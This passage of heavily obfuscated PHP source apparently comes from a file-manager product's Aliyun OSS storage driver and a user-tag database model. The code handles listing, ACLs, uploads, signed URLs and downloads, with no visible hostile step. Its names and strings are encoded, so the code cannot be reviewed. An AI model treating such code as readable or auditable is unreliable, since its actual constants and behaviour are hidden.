strtotime($îñêÏÂ¶[$®¨Œ±Ë[1469]])); } if (isset($ÈŒõÙ[$®¨Œ±Ë[99]])) { $‘ÉÙøêó[$®¨Œ±Ë[99]] = $ÈŒõÙ[$®¨Œ±Ë[99]]; } if (isset($ÈŒõÙ[$®¨Œ±Ë[244]])) { $‘ÉÙøêó[$®¨Œ±Ë[244]] = $ÈŒõÙ[$®¨Œ±Ë[244]]; } return $‘ÉÙøêó; } public function listPath($ÔĞòß„, $£òåÀÎ• = false) { $¬Ô¾ß¹ =& $_SERVER[ü¢ÙÊñÛ]; $Ì„Ğ÷  = $this->fileList($ÔĞòß„, $¬Ô¾ß¹[18], !0); foreach ($Ì„Ğ÷ [$¬Ô¾ß¹[96]] as $ıš“ÛĞÜ => $«„¤î¢‘) { $Ì„Ğ÷ [$¬Ô¾ß¹[96]][$ıš“ÛĞÜ] = $this->folderInfo($«„¤î¢‘, $£òåÀÎ•, $«„¤î¢‘); } foreach ($Ì„Ğ÷ [$¬Ô¾ß¹[97]] as $ıš“ÛĞÜ => $«„¤î¢‘) { $Ì„Ğ÷ [$¬Ô¾ß¹[97]][$ıš“ÛĞÜ] = $this->fileInfo($«„¤î¢‘[$¬Ô¾ß¹[42]], $£òåÀÎ•, $«„¤î¢‘); } return $Ì„Ğ÷ ; } protected function infoChildren($ˆ“Äï©ı, &$îİœÎ»ø) { $éÏêÌ =& $_SERVER[ü¢ÙÊñÛ]; $£‰¡ÌÊß = $this->fileList($ˆ“Äï©ı, $éÏêÌ[22], !0); $îİœÎ»ø[$éÏêÌ[92]] += count($£‰¡ÌÊß[$éÏêÌ[96]]); $îİœÎ»ø[$éÏêÌ[91]] += count($£‰¡ÌÊß[$éÏêÌ[97]]); foreach ($£‰¡ÌÊß[$éÏêÌ[97]] as $ëÊøù‘¹) { if (!$ëÊøù‘¹ || !$ëÊøù‘¹[$éÏêÌ[90]]) { continue; } $îİœÎ»ø[$éÏêÌ[90]] += $ëÊøù‘¹[$éÏêÌ[90]]; } } public function has($ÄÃª‘øü, $üÔÕ¹íç = false, $¼™·Òï = true) { $âòŒ¸ƒ¥ =& $_SERVER[ü¢ÙÊñÛ]; $ÄÃª‘øü = trim($ÄÃª‘øü, $âòŒ¸ƒ¥[18]); $„¥Ğşœ— = empty($ÄÃª‘øü) && $ÄÃª‘øü !== $âòŒ¸ƒ¥[241] ? $âòŒ¸ƒ¥[22] : $ÄÃª‘øü . $âòŒ¸ƒ¥[18]; $ù‰èãş€ = $âòŒ¸ƒ¥[22]; $‘¡±«ëâ = 500; $¬¹Úõ„™ = $¼ÀÍ€ÖÏ = 0; while (!0) { check_abort(); $ÒŞ¤İ›µ = array($âòŒ¸ƒ¥[1463] => $âòŒ¸ƒ¥[18], $âòŒ¸ƒ¥[1464] => $„¥Ğşœ—, $âòŒ¸ƒ¥[1465] => $‘¡±«ëâ, $âòŒ¸ƒ¥[1466] => $ù‰èãş€); try { $Ûæğ±Ò“ = $this->client->listObjects($this->bucket, $ÒŞ¤İ›µ); } catch (OSS\Core\OssException $Š»ˆÕæ‘) { $this->writeLog(__FUNCTION__ . $âòŒ¸ƒ¥[225] . $Š»ˆÕæ‘->getMessage()); break; } $ù‰èãş€ = $Ûæğ±Ò“->getNextMarker(); $†é›¿– = $Ûæğ±Ò“->getObjectList(); $¤Ëôºˆç = $Ûæğ±Ò“->getPrefixList(); if ($üÔÕ¹íç) { if (count($†é›¿–) > 1 || count($†é›¿–) == 1 && $†é›¿–[0]->getKey() != $„¥Ğşœ—) { $¬¹Úõ„™ += count($†é›¿–) - 1; } if (!empty($¤Ëôºˆç)) { $¼ÀÍ€ÖÏ += count($¤Ëôºˆç); } if ($ù‰èãş€ === $âòŒ¸ƒ¥[22]) { break; } continue; } if ($¼™·Òï) { if (!empty($†é›¿–)) { if (count($†é›¿–) > 1 || $†é›¿–[0]->getKey() != $„¥Ğşœ—) { return !0; } } } else { if (!empty($¤Ëôºˆç)) { return !0; } } if ($ù‰èãş€ === $âòŒ¸ƒ¥[22]) { break; } } if ($üÔÕ¹íç) { return array($âòŒ¸ƒ¥[252] => $¬¹Úõ„™, $âòŒ¸ƒ¥[253] => $¼ÀÍ€ÖÏ); } return !1; } public function listAll($«ËÊíˆ¨) { $¹ÄøïôÈ =& $_SERVER[ü¢ÙÊñÛ]; $–İÂ»¬¶ = $this->fileList($«ËÊíˆ¨, $¹ÄøïôÈ[22], !0); $„æëÈ¾‚ = array_to_keyvalue($–İÂ»¬¶[$¹ÄøïôÈ[97]], $¹ÄøïôÈ[42]); foreach ($–İÂ»¬¶[$¹ÄøïôÈ[96]] as $«™¥ßÊ) { if (is_string($«™¥ßÊ)) { $„æëÈ¾‚[$«™¥ßÊ] = array($¹ÄøïôÈ[90] => 0); } } return $this->listAllFiles($«ËÊíˆ¨, $„æëÈ¾‚); } public function canRead($’ÑãîêŠ) { $Èì«ÂÓ‡ =& $_SERVER[ü¢ÙÊñÛ]; $Û°¾³ = $this->pathAcl($’ÑãîêŠ); return $Û°¾³ == $Èì«ÂÓ‡[1473] || $Û°¾³ == $Èì«ÂÓ‡[633] ? !0 : !1; } public function canWrite($‰­²ñ”Å) { $Î–íå¢‹ = $this->pathAcl($‰­²ñ”Å); return $Î–íå¢‹ == $_SERVER[ü¢ÙÊñÛ][633] ? !0 : !1; } public function pathAcl($¨ò¹‰ü–) { $üÙê¼œß =& $_SERVER[ü¢ÙÊñÛ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $«§ì¸÷î = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¨ò¹‰ü–)); } catch (OSS\Core\OssException $¾ı»à’) { $this->writeLog(__FUNCTION__ . $üÙê¼œß[225] . $¾ı»à’->getMessage()); return !1; } $ˆ‹½»¯š = $«§ì¸÷î == $üÙê¼œß[47] ? $this->bucketAcl : $«§ì¸÷î; if ($ˆ‹½»¯š == $üÙê¼œß[1474]) { return $üÙê¼œß[1473]; } if ($ˆ‹½»¯š == $üÙê¼œß[1475]) { return $üÙê¼œß[633]; } return $ˆ‹½»¯š; } private function chmodPath($ŞÖŸÁï, $µ¢ªÖ¬™ = '') { $ÎÛß‹ŸÇ =& $_SERVER[ü¢ÙÊñÛ]; $‘„¢‘À¬ = empty($µ¢ªÖ¬™) ? $ÎÛß‹ŸÇ[1475] : $µ¢ªÖ¬™; $´Ì–ÂÂü = array($ÎÛß‹ŸÇ[47], $ÎÛß‹ŸÇ[242], $ÎÛß‹ŸÇ[1474], $ÎÛß‹ŸÇ[1475]); if (!in_array($‘„¢‘À¬, $´Ì–ÂÂü)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ŞÖŸÁï), $‘„¢‘À¬); } catch (OSS\Core\OssException $î—Óåò) { $this->writeLog(__FUNCTION__ . $ÎÛß‹ŸÇ[225] . $î—Óåò->getMessage()); return !1; } return !0; } public function getContent($®ê¦´Ïô) { return $this->fileSubstr($®ê¦´Ïô, -1); } public function setContent($—Êò›ŸÖ, $ÕéÃü” = '') { $«­ó±½³ =& $_SERVER[ü¢ÙÊñÛ]; try { $Ğê±½ˆä = $this->trafficLimit($«­ó±½³[1476]); $’éÓÂïƒ = $this->client->putObject($this->bucket, $this->pathEncode($—Êò›ŸÖ), $ÕéÃü”, $Ğê±½ˆä); } catch (OSS\Core\OssException $¥³°‘„) { $this->writeLog(__FUNCTION__ . $«­ó±½³[225] . $¥³°‘„->getMessage()); return !1; } $‘¡Ûæ‰³ = array($«­ó±½³[1470] => trim($’éÓÂïƒ[$«­ó±½³[1467]], $«­ó±½³[132]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($—Êò›ŸÖ))); $this->updateObjMeta($—Êò›ŸÖ, $‘¡Ûæ‰³); return isset($’éÓÂïƒ[$«­ó±½³[1477]][$«­ó±½³[306]]) ? !0 : !1; } private function updateObjMeta($¨’æİî¹, $™çÂ‰ì°) { $¨’æİî¹ = $this->pathEncode($¨’æİî¹); try { $Ş‚ÊåõÈ = array(OSS\OssClient::OSS_HEADERS => $™çÂ‰ì°); $this->client->copyObject($this->bucket, $¨’æİî¹, $this->bucket, $¨’æİî¹, $Ş‚ÊåõÈ); } catch (OSS\Core\OssException $³“ê¼©£) { $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][225] . $³“ê¼©£->getMessage()); return !1; } return !0; } public function upload($‘ìØ¨ğŸ, $ÎËé–ªÅ, $Û¤õ´› = false, $ü¾İñ€ã = REPEAT_REPLACE) { $–šÆİÕ =& $_SERVER[ü¢ÙÊñÛ]; $÷›È‰¸· = trim($‘ìØ¨ğŸ, $–šÆİÕ[18]); $ìíæ³¥Ö = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($–šÆİÕ[1470] => @md5_file($ÎËé–ªÅ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‘ìØ¨ğŸ))); $ìíæ³¥Ö = $this->trafficLimit($–šÆİÕ[1476], $ìíæ³¥Ö); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($÷›È‰¸·), $ÎËé–ªÅ, $ìíæ³¥Ö); } catch (OSS\Core\OssException $œ”£â•) { $this->writeLog(__FUNCTION__ . $–šÆİÕ[225] . $œ”£â•->getMessage()); return !1; } return $this->getPathOuter($‘ìØ¨ğŸ); } public function getHost() { $·ú±ó¤– =& $_SERVER[ü¢ÙÊñÛ]; $ªóæÌÂ = explode($·ú±ó¤–[221], parent::getHost()); return $ªóæÌÂ[0] . $·ú±ó¤–[221] . $this->bucket . $·ú±ó¤–[20] . $ªóæÌÂ[1]; } public function uploadFormData($óíÉğ³ƒ, $óòŞ ´ = 3600) { $–»õ•ˆö =& $_SERVER[ü¢ÙÊñÛ]; if (!($åÚ¥Ä¡Ÿ = $this->getHost())) { return !1; } $Ÿ€Ñ¦¡ = $óòŞ ´; $¥øØ§óÌ = date($–»õ•ˆö[1478], time() + $Ÿ€Ñ¦¡); $´Î‰Õ¤Ô = new DateTime($¥øØ§óÌ); $ÃÏ•Ã¯ = $´Î‰Õ¤Ô->format(DateTime::ISO8601); $Ê¢š¯ ı = strpos($ÃÏ•Ã¯, $–»õ•ˆö[383]); $ÃÏ•Ã¯ = substr($ÃÏ•Ã¯, 0, $Ê¢š¯ ı) . $–»õ•ˆö[1479]; $£–Õ’‹ = 1048576000 * 5; $¯ŞÙÕ¦ = $this->pathFather($óíÉğ³ƒ); $‡€Îî£Ô = array($–»õ•ˆö[275] => $ÃÏ•Ã¯, $–»õ•ˆö[278] => array(array($–»õ•ˆö[1480], 0, $£–Õ’‹), array($–»õ•ˆö[280], $–»õ•ˆö[281], $¯ŞÙÕ¦))); $Ÿû»„³ñ = base64_encode(json_encode($‡€Îî£Ô)); $ÚÀ˜‘Å… = base64_encode(hash_hmac($–»õ•ˆö[1401], $Ÿû»„³ñ, $this->secret, !0)); $Ô¸¼ı† = array($–»õ•ˆö[1481] => $this->accessKey, $–»õ•ˆö[290] => $Ÿû»„³ñ, $–»õ•ˆö[283] => $–»õ•ˆö[274], $–»õ•ˆö[1482] => $ÚÀ˜‘Å…, $–»õ•ˆö[219] => $åÚ¥Ä¡Ÿ); $Ô¸¼ı† = $this->trafficLimit($–»õ•ˆö[1476], $Ô¸¼ı†, !0); return $Ô¸¼ı†; } public function uploadMultiData($åî¡î, $áò˜ º = 3600) { $ÎŸı´Ì =& $_SERVER[ü¢ÙÊñÛ]; if (!($†Ü—ƒäˆ = $this->getHost())) { return !1; } $¦à¸ÆÎí = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($åî¡î)); return array($ÎŸı´Ì[294] => $¦à¸ÆÎí, $ÎŸı´Ì[219] => $†Ü—ƒäˆ . $ÎŸı´Ì[18] . $this->pathEncode($åî¡î), $ÎŸı´Ì[295] => gmdate($ÎŸı´Ì[1483]), $ÎŸı´Ì[108] => $åî¡î); } public function uploadMultiAuth($¸Ô¬³Ó, $õë°Íœ = array()) { if (isset($õë°Íœ[$_SERVER[ü¢ÙÊñÛ][296]])) { return $this->uploadPartAuth($¸Ô¬³Ó, $õë°Íœ); } return $this->uploadListAuth($¸Ô¬³Ó, $õë°Íœ); } private function uploadPartAuth($•Çá¾°, $°ı©€É¯ = array()) { $º´öû‰µ =& $_SERVER[ü¢ÙÊñÛ]; $í”áŒ¥Ï = $°ı©€É¯[$º´öû‰µ[108]]; $©£¥ëú = $this->_getUploadAuth($í”áŒ¥Ï, $°ı©€É¯); $èıô€à¾ = array($º´öû‰µ[298] => $©£¥ëú[$º´öû‰µ[298]], $º´öû‰µ[295] => $©£¥ëú[$º´öû‰µ[295]]); if (isset($©£¥ëú[$º´öû‰µ[1484]])) { $èıô€à¾[$º´öû‰µ[1484]] = $©£¥ëú[$º´öû‰µ[1484]]; } return $èıô€à¾; } private function uploadListAuth($“§’¥òŠ, $ÀŠÊ…¬ = array()) { $³Ï è°ı =& $_SERVER[ü¢ÙÊñÛ]; $ûà‘…ë¨ = $ÀŠÊ…¬[$³Ï è°ı[108]]; $÷´Â´ ¡ = $ÀŠÊ…¬[$³Ï è°ı[294]]; $©º‡è = $this->client->listParts($this->bucket, $this->pathEncode($ûà‘…ë¨), $÷´Â´ ¡); $á¥…÷›÷ = $©º‡è->getListPart(); $ŞµÂÄ¦  = array(); foreach ($á¥…÷›÷ as $îµš‘ı) { $ŞµÂÄ¦ [] = array($³Ï è°ı[309] => $îµš‘ı->getPartNumber(), $³Ï è°ı[310] => trim($îµš‘ı->getETag(), $³Ï è°ı[132])); } if (!$ŞµÂÄ¦ ) { return !1; } $­ôõÇİè = $this->_getUploadAuth($ûà‘…ë¨, $ÀŠÊ…¬); return array($³Ï è°ı[298] => $­ôõÇİè[$³Ï è°ı[298]], $³Ï è°ı[295] => $­ôõÇİè[$³Ï è°ı[295]], $³Ï è°ı[301] => $ŞµÂÄ¦ ); } private function _getUploadAuth($»ÄŸ¥ …, $Ø…Òßä) { $Í—±«ë— =& $_SERVER[ü¢ÙÊñÛ]; $Ïçè¿€ = gmdate($Í—±«ë—[1483]); $åœ­’½Î = isset($Ø…Òßä[$Í—±«ë—[296]]) ? $Í—±«ë—[266] : $Í—±«ë—[300]; $€€Òò€õ = array_intersect_key($Ø…Òßä, array_flip(array($Í—±«ë—[296], $Í—±«ë—[294]))); ksort($€€Òò€õ); $ö‰»æ‘ = $€€Òò€õ ? $Í—±«ë—[87] . http_build_query($€€Òò€õ, null, $Í—±«ë—[297], PHP_QUERY_RFC3986) : $Í—±«ë—[22]; $¨ÚîÅªò = array($åœ­’½Î, $Í—±«ë—[22], $Í—±«ë—[134], $Ïçè¿€, "\x78\55\157\163\x73\x2d\144\x61\x74\x65\x3a{$Ïçè¿€}", $Í—±«ë—[18] . $this->bucket . $Í—±«ë—[18] . $»ÄŸ¥ … . $ö‰»æ‘); if (isset($Ø…Òßä[$Í—±«ë—[296]])) { $ò‚ê¥ô = $this->trafficLimit($Í—±«ë—[1476], array(), !0); if ($ò‚ê¥ô) { $»ÄŸ¥ … = $Í—±«ë—[1484]; array_splice($¨ÚîÅªò, 5, 0, $»ÄŸ¥ … . $Í—±«ë—[14] . $ò‚ê¥ô[$»ÄŸ¥ …]); } } $£ŞÀÜì = implode($Í—±«ë—[10], $¨ÚîÅªò); $­·³µ©Ä = base64_encode(hash_hmac($Í—±«ë—[1401], $£ŞÀÜì, $this->secret, !0)); $èêĞ¿¦› = $Í—±«ë—[1453] . $this->accessKey . $Í—±«ë—[14] . $­·³µ©Ä; $úß†“­Ä = array($Í—±«ë—[298] => $èêĞ¿¦›, $Í—±«ë—[295] => $Ïçè¿€); if (!empty($ò‚ê¥ô)) { $úß†“­Ä = array_merge($úß†“­Ä, $ò‚ê¥ô); } return $úß†“­Ä; } public function download($å”ÚîÑµ, $óîµ¶Ú) { $¬¹ò½Èƒ =& $_SERVER[ü¢ÙÊñÛ]; if ($this->isFolder($å”ÚîÑµ)) { return !1; } try { $¹•¸™£ï = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $óîµ¶Ú); $¹•¸™£ï = $this->trafficLimit($¬¹ò½Èƒ[123], $¹•¸™£ï); $this->client->getObject($this->bucket, $this->pathEncode($å”ÚîÑµ), $¹•¸™£ï); } catch (OSS\Core\OssException $ıß§¸ª) { $this->writeLog(__FUNCTION__ . $¬¹ò½Èƒ[225] . $ıß§¸ª->getMessage()); return !1; } return $óîµ¶Ú; } public function fileSubstr($Í“•¾Ãó, $˜ÙÀÚÚˆ = 0, $ù–§‹¢ = false) { if ($˜ÙÀÚÚˆ === -1) { $Ù—µÃÂ = array(); } else { if ($ù–§‹¢ === !1) { $ğÊƒóÓ© = $this->size($Í“•¾Ãó); } else { $ğÊƒóÓ© = $˜ÙÀÚÚˆ + $ù–§‹¢ - 1; } $Ù—µÃÂ = array(OSS\OssClient::OSS_RANGE => "{$˜ÙÀÚÚˆ}\55{$ğÊƒóÓ©}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Í“•¾Ãó), $Ù—µÃÂ); } catch (OSS\Core\OssException $ŞŠğŒ²) { $this->writeLog(__FUNCTION__ . $_SERVER[ü¢ÙÊñÛ][225] . $ŞŠğŒ²->getMessage()); think_exception($ŞŠğŒ²->getMessage()); return !1; } } private function trafficLimit($¤¹§¥¾, $‹¬£İ‰ = array(), $ª£“¾ = false) { $Û°Â¾Úµ =& $_SERVER[ü¢ÙÊñÛ]; if ($¤¹§¥¾ == $Û°Â¾Úµ[1476] && $this->isUploadServer() || $¤¹§¥¾ == $Û°Â¾Úµ[123] && $this->isFileOutServer()) { return $‹¬£İ‰; } $õÃïı“ = floatval($GLOBALS[$Û°Â¾Úµ[16]][$Û°Â¾Úµ[103]][$Û°Â¾Úµ[121]][$¤¹§¥¾]) * 1024 * 1024 * 8; if (!$õÃïı“) { return $‹¬£İ‰; } $õÃïı“ = $õÃïı“ < 819200 ? 819200 : ($õÃïı“ > 838860800 ? 838860800 : $õÃïı“); if ($ª£“¾) { $‹¬£İ‰[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($õÃïı“); } else { if (!isset($‹¬£İ‰[OSS\OssClient::OSS_HEADERS])) { $‹¬£İ‰[OSS\OssClient::OSS_HEADERS] = array(); } $‹¬£İ‰[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($õÃïı“); } return $‹¬£İ‰; } public function link($ ’Í®¹ì, $ù×½»Å¢ = array()) { $œ—“İ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->exist($ ’Í®¹ì) || $this->isFolder($ ’Í®¹ì)) { return !1; } try { $ù×½»Å¢ = $this->trafficLimit($œ—“İ[123], $ù×½»Å¢, !0); $Çıë²Õ = $this->client->signUrl($this->bucket, $this->pathEncode($ ’Í®¹ì), 3600 * 12, $œ—“İ[1485], $ù×½»Å¢); return $this->getCdnLink($Çıë²Õ); } catch (OSS\Core\OssException $ Â¼Õ·Å) { $this->writeLog(__FUNCTION__ . $œ—“İ[225] . $ Â¼Õ·Å->getMessage()); return !1; } } public function fileOut($Ö¤ó´Ÿ¹, $í‰¦øØ = false, $Ñˆ„ğ¼İ = false, $›û»ı–½ = '') { $ú³İé¦ğ =& $_SERVER[ü¢ÙÊñÛ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ö¤ó´Ÿ¹, $í‰¦øØ, $Ñˆ„ğ¼İ, $›û»ı–½); } if (!$Ñˆ„ğ¼İ) { $Ñˆ„ğ¼İ = $this->pathThis($Ö¤ó´Ÿ¹); } $Ñˆ„ğ¼İ = rawurlencode($Ñˆ„ğ¼İ); $‰…ø¾î = get_file_mime(get_path_ext($Ñˆ„ğ¼İ)); if ($‰…ø¾î == $ú³İé¦ğ[261]) { return parent::fileOut($Ö¤ó´Ÿ¹, $í‰¦øØ, $Ñˆ„ğ¼İ, $›û»ı–½); } $í‰¦øØ = $í‰¦øØ ? $ú³İé¦ğ[1486] : $ú³İé¦ğ[1487]; $Ç¥æàâİ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ú³İé¦ğ[1488] . rawurlencode("{$í‰¦øØ}\73\146\x69\x6c\145\156\x61\155\x65\x3d{$Ñˆ„ğ¼İ}")); $Ç¥æàâİ[OSS\OssClient::OSS_SUB_RESOURCE] .= $ú³İé¦ğ[1489] . rawurlencode($‰…ø¾î); $Şâè’¸ï = $this->link($Ö¤ó´Ÿ¹, $Ç¥æàâİ); $this->fileOutLink($Şâè’¸ï); } public function fileOutServer($¹ğšşÃÙ, $á µÆúü = false, $ÂÃîã½» = false, $¢èÀœ¼  = '') { parent::fileOut($¹ğšşÃÙ, $á µÆúü, $ÂÃîã½», $¢èÀœ¼ ); } public function fileOutImage($…¦ò€–Ø, $²óóğù = 250) { if ($this->size($…¦ò€–Ø) > 1024 * 1024 * 20) { return $this->fileOutImageServer($…¦ò€–Ø, $²óóğù); } $¹ı†”Û = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ü¢ÙÊñÛ][1450] . $²óóğù); $Ô¥¦Ç¡Õ = $this->link($…¦ò€–Ø, $¹ı†”Û); $this->fileOutLink($Ô¥¦Ç¡Õ); } public function fileOutImageServer($‡ƒê²¡æ, $£§êìÓû = 250) { parent::fileOutImage($‡ƒê²¡æ, $£§êìÓû); } public function fileOutLink($Ù›óİÀ’) { $áÃå€Ñæ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->isCdnHost() && substr($Ù›óİÀ’, 0, 7) == $áÃå€Ñæ[229]) { $Ù›óİÀ’ = $áÃå€Ñæ[230] . substr($Ù›óİÀ’, 7); } header($áÃå€Ñæ[186] . $Ù›óİÀ’); die; } public function hashMd5($·ÒÛ¬›•, $Š›ÊÆºÀ = '') { $´éø‡Ë‰ =& $_SERVER[ü¢ÙÊñÛ]; $Ñ•øàâ¥ = $this->_objectMeta($·ÒÛ¬›•); if (!$Ñ•øàâ¥) { return $´éø‡Ë‰[22]; } if (!isset($Ñ•øàâ¥[$´éø‡Ë‰[1470]]) && !empty($Š›ÊÆºÀ)) { $–ˆ¤Òº = $this->updateObjMeta($·ÒÛ¬›•, array($´éø‡Ë‰[1470] => $Š›ÊÆºÀ)); $Ñ•øàâ¥[$´éø‡Ë‰[1470]] = $–ˆ¤Òº ? $Š›ÊÆºÀ : $´éø‡Ë‰[22]; } return isset($Ñ•øàâ¥[$´éø‡Ë‰[1470]]) ? strtolower($Ñ•øàâ¥[$´éø‡Ë‰[1470]]) : $´éø‡Ë‰[22]; } public function size($ßœÖÈã) { $µô¦µş = $this->objectMeta($ßœÖÈã); return $µô¦µş ? $µô¦µş[$_SERVER[ü¢ÙÊñÛ][90]] : 0; } public function info($ÃÊó†è) { if ($this->isFolder($ÃÊó†è)) { return $this->folderInfo($ÃÊó†è); } else { if ($this->isFile($ÃÊó†è)) { return $this->fileInfo($ÃÊó†è); } } return !1; } public function exist($œ±ß¾€§) { return $this->isFile($œ±ß¾€§) || $this->isFolder($œ±ß¾€§); } public function isFile($ù¡ãè¬Ç) { return !$this->isFolder($ù¡ãè¬Ç) && $this->objectMeta($ù¡ãè¬Ç); } public function isFolder($Ğ¢Šı»») { return $this->cacheMethod($_SERVER[ü¢ÙÊñÛ][190], $Ğ¢Šı»»); } protected function objectMeta($îü£şú€) { return $this->cacheMethod($_SERVER[ü¢ÙÊñÛ][192], $îü£şú€); } protected function _objectMeta($ù™ß³ì) { $íŠÊÃ·ó =& $_SERVER[ü¢ÙÊñÛ]; try { $Çˆ‹‡¼ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ù™ß³ì)); } catch (OSS\Core\OssException $ÂÛô‹Ğ©) { $this->writeLog(__FUNCTION__ . $íŠÊÃ·ó[225] . $ÂÛô‹Ğ©->getMessage()); $Çˆ‹‡¼ = !1; } if ($Çˆ‹‡¼) { $Çˆ‹‡¼[$íŠÊÃ·ó[90]] = intval($Çˆ‹‡¼[$íŠÊÃ·ó[1468]]); } return $Çˆ‹‡¼; } protected function _isFolder($°£±‘£) { $¢ÕÄ—óÅ =& $_SERVER[ü¢ÙÊñÛ]; if ($°£±‘£ == $¢ÕÄ—óÅ[22] || $°£±‘£ == $¢ÕÄ—óÅ[18]) { return !0; } $Ó—ë •À = array($¢ÕÄ—óÅ[1463] => $¢ÕÄ—óÅ[18], $¢ÕÄ—óÅ[1464] => rtrim($°£±‘£, $¢ÕÄ—óÅ[18]) . $¢ÕÄ—óÅ[18], $¢ÕÄ—óÅ[1465] => 1, $¢ÕÄ—óÅ[1466] => $¢ÕÄ—óÅ[22]); $â‹â§şÕ = $this->client->listObjects($this->bucket, $Ó—ë •À); if ($â‹â§şÕ->getObjectList() || $â‹â§şÕ->getPrefixList()) { return !0; } return !1; } public function writeLog($¼¢ë­˜Í = '', $ÏÙş¯… = false) { $œƒ€ßû¾ =& $_SERVER[ü¢ÙÊñÛ]; $»ëÃ…öŸ = in_array(ACTION, array($œƒ€ßû¾[223], $œƒ€ßû¾[224])); if (!$»ëÃ…öŸ && !GLOBAL_DEBUG) { return; } $ÍËôâúï = 0; if (stripos($¼¢ë­˜Í, $œƒ€ßû¾[1490]) !== !1) { $ÍËôâúï = 1; $Ô¨’–ÇÃ = explode($œƒ€ßû¾[1491], $¼¢ë­˜Í); $¼¢ë­˜Í = !empty($Ô¨’–ÇÃ[1]) ? $Ô¨’–ÇÃ[1] : $¼¢ë­˜Í; } else { if (stripos($¼¢ë­˜Í, $œƒ€ßû¾[1492])) { $ÍËôâúï = 2; $Ô¨’–ÇÃ = explode($œƒ€ßû¾[1492], $¼¢ë­˜Í); $Ô¨’–ÇÃ = explode($œƒ€ßû¾[14], $Ô¨’–ÇÃ[0]); $¼¢ë­˜Í = !empty($Ô¨’–ÇÃ[1]) ? $Ô¨’–ÇÃ[1] : $¼¢ë­˜Í; } } if ($»ëÃ…öŸ && I18n::getType() == $œƒ€ßû¾[1493]) { if ($ÍËôâúï == 1) { $¼¢ë­˜Í = str_replace($œƒ€ßû¾[1494], $œƒ€ßû¾[1495], $¼¢ë­˜Í); } else { if ($ÍËôâúï == 2) { $Ô¨’–ÇÃ = explode($œƒ€ßû¾[225], $Ô¨’–ÇÃ[0]); $Ÿı„¶«¹ = isset($Ô¨’–ÇÃ[1]) ? $Ô¨’–ÇÃ[1] : $œƒ€ßû¾[22]; $ñÜ©ı±¹ = array($œƒ€ßû¾[1496] => $œƒ€ßû¾[1497], $œƒ€ßû¾[1498] => $œƒ€ßû¾[1499], $œƒ€ßû¾[1500] => $œƒ€ßû¾[1501], $œƒ€ßû¾[1502] => $œƒ€ßû¾[1503], $œƒ€ßû¾[1504] => $œƒ€ßû¾[1505], $œƒ€ßû¾[1506] => $œƒ€ßû¾[1507], $œƒ€ßû¾[1508] => $œƒ€ßû¾[1509], $œƒ€ßû¾[1510] => $œƒ€ßû¾[1511], $œƒ€ßû¾[1512] => $œƒ€ßû¾[1513], $œƒ€ßû¾[1514] => $œƒ€ßû¾[1515]); if (isset($ñÜ©ı±¹[$Ÿı„¶«¹])) { $¼¢ë­˜Í = $ñÜ©ı±¹[$Ÿı„¶«¹]; } } } if (stripos($¼¢ë­˜Í, $œƒ€ßû¾[1516])) { $¼¢ë­˜Í = $œƒ€ßû¾[1517]; } } if (!trim($¼¢ë­˜Í)) { return; } parent::writeLog(trim($¼¢ë­˜Í), $ÏÙş¯…); } } goto fÓ¾ÊÔó¹; Aî¸êìöŸ¤: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\141\166"; protected function cacheFunctionAlias($×±òÒ») { $²© ø£ =& $_SERVER[ü¢ÙÊñÛ]; return array($²© ø£[2074] => array($²© ø£[2498] . USER_ID, $²© ø£[2075])); } protected function listData() { $³æ…®Èº =& $_SERVER[ü¢ÙÊñÛ]; $¦›€·»¹ = array($³æ…®Èº[1750] => USER_ID, $³æ…®Èº[568] => array($³æ…®Èº[2078], 0)); $¿ï÷‹ÚË = $³æ…®Èº[2499]; $”–‡áù = $this->field($¿ï÷‹ÚË)->where($¦›€·»¹)->order($³æ…®Èº[2081])->select(); return $”–‡áù ? $”–‡áù : array(); } protected function addToTag($ĞòÆÌ×à, $£äµØ°–) { $š¶Âˆˆí =& $_SERVER[ü¢ÙÊñÛ]; if (!Model($š¶Âˆˆí[2227])->listData($£äµØ°–)) { return !1; } if (is_numeric($ĞòÆÌ×à)) { $¹Ì†Ûû÷ = Model($š¶Âˆˆí[890])->pathInfo($ĞòÆÌ×à); if (!$¹Ì†Ûû÷) { return !1; } } else { $¹Ì†Ûû÷ = IO::infoSimple($ĞòÆÌ×à); if (!$¹Ì†Ûû÷) { return !1; } $‡—ÓßÙ· = $¹Ì†Ûû÷[$š¶Âˆˆí[42]]; $Ú‚ÕŒ½ = $¹Ì†Ûû÷[$š¶Âˆˆí[43]]; if (isset($¹Ì†Ûû÷[$š¶Âˆˆí[496]])) { $Ú‚ÕŒ½ = $¹Ì†Ûû÷[$š¶Âˆˆí[496]] == $š¶Âˆˆí[102] ? $š¶Âˆˆí[89] : $š¶Âˆˆí[243]; } } $ûåæ… = array($š¶Âˆˆí[1750] => USER_ID, $š¶Âˆˆí[568] => $£äµØ°–, $š¶Âˆˆí[506] => $ĞòÆÌ×à, $š¶Âˆˆí[507] => $Ú‚ÕŒ½ ? $Ú‚ÕŒ½ : $š¶Âˆˆí[501], $š¶Âˆˆí[505] => $‡—ÓßÙ· ? $‡—ÓßÙ· : $š¶Âˆˆí[22], $š¶Âˆˆí[1963] => 0); if ($this->where($ûåæ…)->find()) { return !1; } return $this->add($ûåæ…); } protected function removeFromTag($ìü‘¹°ä, 